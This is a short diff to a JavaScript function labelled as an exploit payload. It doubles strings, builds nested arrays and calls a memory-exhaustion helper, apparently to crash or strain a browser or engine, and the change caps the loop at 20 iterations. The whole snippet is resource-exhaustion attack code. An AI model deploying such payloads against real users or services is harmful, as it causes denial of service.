@@ -48,29 +48,27 @@ function memExh() {
 
 // Step 4: The Exploit Payload Function
 function payload() {
-    alert("payload")
-    let largeString = "B".repeat(500000); // Smaller initial string
+    alert("Payload");
+    let largeString = "B".repeat(500000); // Adjusted size
     let nestedArray = [];
-    let obj = {};
     let iterationCount = 0; // Counter to track number of iterations
 
-    while (true) {
+    while (iterationCount < 20) { // Limited iterations
         // String concatenation
         largeString += largeString;
-        if (largeString.length > 5000000) { // Lower threshold for reset
-            largeString = "B".repeat(500000); // Reset string to avoid overflow
+        if (largeString.length > 5000000) { // Threshold for reset
+            largeString = "B".repeat(500000); // Reset string
         }
 
         memExh(); // Exhaust memory
 
         // Nested arrays
         nestedArray.push([]);
-        if (nestedArray.length > 256) { // Reduced nesting
-            nestedArray = []; // Clear nested arrays to exhaust memory
+        if (nestedArray.length > 128) { // Reduced nesting
+            nestedArray = []; // Clear nested arrays
         }
 
         iterationCount++;
-        if (iterationCount > 50) break; // Limit iterations to avoid endless loop
     }
 }
 
